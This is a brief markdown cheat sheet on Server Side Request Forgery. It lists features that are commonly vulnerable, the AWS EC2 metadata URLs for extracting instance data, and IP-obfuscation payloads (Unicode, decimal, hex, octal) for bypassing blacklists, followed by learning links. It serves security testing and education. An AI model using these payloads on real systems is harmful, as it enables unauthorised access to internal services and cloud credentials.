# Server Side Request Forgery (SSRF)

**Unordered top 5 features that are often prone to SSRF vulnerabilities**

* Webhooks
* PDF generators
* Document parsers
* Link expansion
* File uploads

### Extract EC2 configuration files

> Amazon exposes an internal service every EC2 instance can query for instance metadata about the host.

[AWS Documentation](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/ (zip file)
```

## Bypassing filters

### Blacklisted IPs

If the service has blacklisted internal IP addresses this might be possible to bypass in numerous ways.

[This script](https://github.com/cujanovic/SSRF-Testing/blob/master/ip.py) will output possible bypass vectors like the ones below.

```
http://169。254。169。254/
http://169｡254｡169｡254/
http://⑯⑨。②⑤④。⑯⑨｡②⑤④/
http://②⑧⑤②⓪③⑨①⑥⑥:80/
http://④②⑤｡⑤①⓪｡④②⑤｡⑤①⓪:80/
http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]:80/
http://[::ⓕⓕⓕⓕ:①⑥⑨。②⑤④。⑯⑨。②⑤④]:80/
```

#### Decimal

[IPv4 to decimal converter](https://www.browserling.com/tools/ip-to-dec)

```
target.com/?url=http://2130706433 (127.0.0.1)
```

#### Hexadecimal

[IPv4 to hexadecimal converter](https://www.browserling.com/tools/ip-to-hex)

```
target.com/?url=http://0x7f.0x00.0x00.0x01 (127.0.0.1)
target.com/?url=http://0x7f000001          (127.0.0.1)
```

#### Octal

> Not positive that this works well or at all. Still testing

[IPv4 to octal converter](https://www.browserling.com/tools/ip-to-oct)

```
target.com/?url=http://0177.0000.0000.0001 (127.0.0.1)
target.com/?url=http://017700000001        (127.0.0.1)
```

## Resources

* **Reading**
  * **Articles**
    * [Server-Side Request Forgery (SSRF) Attacks - Part 1: The basics](https://medium.com/poka-techblog/server-side-request-forgery-ssrf-attacks-part-1-the-basics-a42ba5cc244a)
    * [Server-Side Request Forgery (SSRF) Attacks  - Part 2: Fun with IPv4 addresses](https://medium.com/poka-techblog/server-side-request-forgery-ssrf-attacks-part-2-fun-with-ipv4-addresses-eb51971e476d)
    * [Server-Side Request Forgery (SSRF)  Attacks - Part 3: Other advanced techniques](https://medium.com/poka-techblog/server-side-request-forgery-ssrf-part-3-other-advanced-techniques-3f48cbcad27e)
    * [What is server side request forgery (SSRF)?](https://blog.detectify.com/2019/01/10/what-is-server-side-request-forgery-ssrf/)
    * [How To: Server-Side Request Forger (SSRF)](https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF)
  * **Writeups**
    * [SSRF in proxy.duckduckgo.com via the image_host parameter](https://hackerone.com/reports/358119)
    
* **Hands On**
  * [SSRF Lab](https://github.com/m6a-UdS/ssrf-lab)

* **Tools & Services**
  * [IPv4 to decimal converter](https://www.browserling.com/tools/ip-to-dec) (Online Service)
  * [IPv4 to octal converter](https://www.browserling.com/tools/ip-to-oct)
  * [IPv4 to hexadecimal converter](https://www.browserling.com/tools/ip-to-hex)
  * [SSRF testing resources](https://github.com/cujanovic/SSRF-Testing) (Github Repo)
